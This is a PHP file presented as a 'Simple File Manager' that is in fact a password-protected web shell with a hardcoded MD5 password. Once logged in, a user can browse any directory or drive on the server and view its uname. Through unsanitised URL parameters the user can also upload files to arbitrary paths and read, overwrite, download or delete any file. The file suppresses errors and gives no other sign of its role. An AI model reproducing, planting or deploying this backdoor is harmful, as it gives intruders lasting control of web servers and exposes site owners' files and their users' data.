<!DOCTYPE html>
<html>
<head>
	<title>Simple File Manager</title>
</head>
<body>	
	<style> body { margin: 0; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"; font-size: 1rem; font-weight: 400; line-height: 1.5; } input, button { border: none; color: white; padding: 15px 32px; text-align: center; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; background-color: #e7e7e7; color: black; }  input:hover, button:hover { background-color: #f8f8f8; border: 1px solid black; } * { box-sizing: border-box; } *, ::after, ::before { box-sizing: border-box; }  ul { list-style-type: none; padding: 0; margin: 0; }  ul li { border-bottom: 1px solid #ddd; margin-top: -1px; /* Prevent double borders */ padding: 12px; }  ul span { color: #fff; background-color: #007bff; font-weight: bold; border-radius:20%; padding: 5px 10px; text-align: center; float:right; }  a { color: #007bff; text-decoration: none; background-color: transparent; } a:hover { color: -webkit-link; cursor: pointer; text-decoration: underline; } a:not([href]) { color: inherit; text-decoration: none; }  textarea.form-control { height: auto; }  .form-control { display: block; width: 100%; height: calc(1.5em + 0.75rem + 2px); padding: 0.375rem 0.75rem; font-size: 1rem; font-weight: 400; line-height: 1.5; color: #495057; background-color: #fff; background-clip: padding-box; border: 1px solid #ced4da; border-radius: 0.25rem; transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out; } textarea { overflow: auto; resize: vertical; }</style>

	<script type="text/javascript">
		function addUrlParameter(nama, value){
			var newURL = location.href.split("?search")[0];
			window.history.pushState('object',document.title,newURL);
			var searchParams = new URLSearchParams(window.location.search)
			searchParams.set(nama,value)			
			window.location.search = searchParams.toString()
		}

		function deleteFile(nama, value){
			if (confirm("Yakin Delete!") == true) {
				addUrlParameter(nama,value);
			} else {
				console.log('cancel');
			}
		}
		console.log('Hacker jangan menyerang !!')
	</script>

	<?php
	error_reporting(0);
	session_start();
	// session_destroy();

	$password = "b68b70b4fa5d1aa81292d4ceb48fcca7"; //md5 : openfile
	
	if (isset($_POST['password'])) {		
		$_SESSION['password'] = md5($_POST['password']);
	}

	if (strval($_SESSION['password'])!=$password) {
		echo '<form action="" method="post" >';
		echo '<input type="password" name="password" size="50"> <input type="submit" id="_upl" value="Login"></form>';
		die();
	}

	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
	echo "<br>";

	function path() {
		if(isset($_GET['dir'])) {
			$dir = str_replace("\\", "/", $_GET['dir']);
			@chdir($dir);
		} else {
			$dir = str_replace("\\", "/", getcwd());
		}
		return $dir;
	}

	function windisk() {
		$letters = "";
		$v = explode("\\", path());
		$v = $v[0];
		foreach(range("A", "Z") as $letter) {
			$bool = $isdiskette = in_array($letter, array("A"));
			if(!$bool) $bool = is_dir("$letter:\\");
			if($bool) {
				$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Pastikan disket dimasukkan dengan benar, jika tidak, kesalahan dapat terjadi.')\"":"").">";
				if($letter.":" != $v) {
					$letters .= $letter;
				}
				else {
					$letters .= color(1, 2, $letter);
				}
				$letters .= "</a> ]";
			}
		}
		if(!empty($letters)) {
			print "Drives : $letters<br>";
		}
		if(count($quicklaunch) > 0) {
			foreach($quicklaunch as $item) {
				$v = realpath(path(). "..");
				if(empty($v)) {
					$a = explode(DIRECTORY_SEPARATOR,path());
					unset($a[count($a)-2]);
					$v = join(DIRECTORY_SEPARATOR, $a);
				}
				print "<a href='".$item[1]."'>".$item[0]."</a>";
			}
		}
	}

	function OS() {
		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
	}

	function getFilePermission($file) {
		$length = strlen(decoct(fileperms($file)))-3;
		return substr(decoct(fileperms($file)),$length);
	}

	if (isset($_GET['act'])) {
		if ($_GET['act']=="download") {
			@ob_clean();
			$file_path = $_GET['dir'].$_GET['f'];
			$filename = $_GET['f'];	
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename($file).'"');
			header("Content-Type: application/octet-stream");
			header("Content-Transfer-Encoding: Binary");
			header("Content-disposition: attachment; filename=\"".$filename."\""); 
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize($file_path));
			readfile($file_path);
			exit;
		}elseif ($_GET['act']=="delete") {
			$file_path = $_GET['dir'].$_GET['f'];
			if(file_exists($file_path)) {

				echo "<script>alert('Berhasil Delete')</script>";
				unlink($file_path);
			} 
		}
	}

	echo "<br>";
	echo "OS : ".OS();
	echo ' <b>('.php_uname().')</b>';
	echo "<br>";
	echo '<br/><div style="float: right;margin-right:20%;">';
	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_GET['dir'].$_FILES['file']['name'])) { echo '<b>Upload Sukses Ngab !!!</b><br><br>'; }
		else { echo '<b>JANCOO** !!! Upload GAGAL !!!</b><br><br>'; }
	}

	echo "</div>";
	echo "<br>";
	echo windisk();
	echo "<br>";

	echo "<br>";
	$basefile = explode("/",$_SERVER['SCRIPT_NAME']);
	// echo path();
	$path = explode("/",path());

	echo '<a href="'.$basefile[count($basefile)-1].'"><svg version="1.1" width="1rem" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 27.02 27.02" style="enable-background:new 0 0 27.02 27.02;" xml:space="preserve"><g><path style="fill: rgb(0, 123, 255);" d="M3.674,24.876c0,0-0.024,0.604,0.566,0.604c0.734,0,6.811-0.008,6.811-0.008l0.01-5.581 c0,0-0.096-0.92,0.797-0.92h2.826c1.056,0,0.991,0.92,0.991,0.92l-0.012,5.563c0,0,5.762,0,6.667,0 c0.749,0,0.715-0.752,0.715-0.752V14.413l-9.396-8.358l-9.975,8.358C3.674,14.413,3.674,24.876,3.674,24.876z" fill="#030104"></path><path style="fill: rgb(0, 123, 255);" d="M0,13.635c0,0,0.847,1.561,2.694,0l11.038-9.338l10.349,9.28c2.138,1.542,2.939,0,2.939,0 L13.732,1.54L0,13.635z" fill="#030104"></path><polygon style="fill: rgb(0, 123, 255);" points="23.83,4.275 21.168,4.275 21.179,7.503 23.83,9.752 " fill="#030104"></polygon></g></svg></a> ';
	foreach ($path as $key => $value) {
		if ($key>0) {
			$temp_dir .= $path[$key-1].'/';
			$direktori = $temp_dir.$value;
		}else{
			$temp_dir .= $path[$key-1];
			$direktori = $value.'/';
		}

		echo '<a href="?dir='.$direktori.'/">'.$value.'</a>/';
	}

//Display directory and file
	$dir = path();	

	echo '<ul class="list-group list-group-flush">';
	$variable = (scandir($dir));
	foreach ($variable as $key => $value) {
		if (is_dir($value)) {
			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a>
			<span class="badge badge-primary badge-pill">'.getFilePermission($_GET['dir'].$value).'</span>
			</li>';
		}
	}

	foreach ($variable as $key => $value) {
		if (!is_dir($value)) {
			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a style="cursor: pointer;" onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a>
			<span class="badge badge-primary badge-pill">'.getFilePermission($_GET['dir'].$value).'</span>
			</li>';			
		}
	}
	echo "</ul><br>";

//Display File Option EDIT,DOWNLOAD,DELETE
	if (isset($_GET['f'])) {
		if (isset($_POST['code'])) {
			$file = fopen($_GET['f'],"w");
			fwrite($file,$_POST['code']);
			fclose($file);
		}
		echo '<div class="card card-body"><form method="POST">';
		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
		echo '<textarea name="code" class="form-control" rows="20" autofocus>'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
		fclose($myfile);
		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/><br></div>
		</form> 
		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
		<button class="btn btn-danger" onclick="deleteFile('."'act','delete'".');">delete</button></div>
		</div>';
	}

	?>
	<br>
	<div style="position:fixed;left: 0;bottom: 0;width:100%; background-color: white;text-align: center;"><b>Copyright@<?=date('Y')?> Peluru Kertas</b></div>
</body>
</html>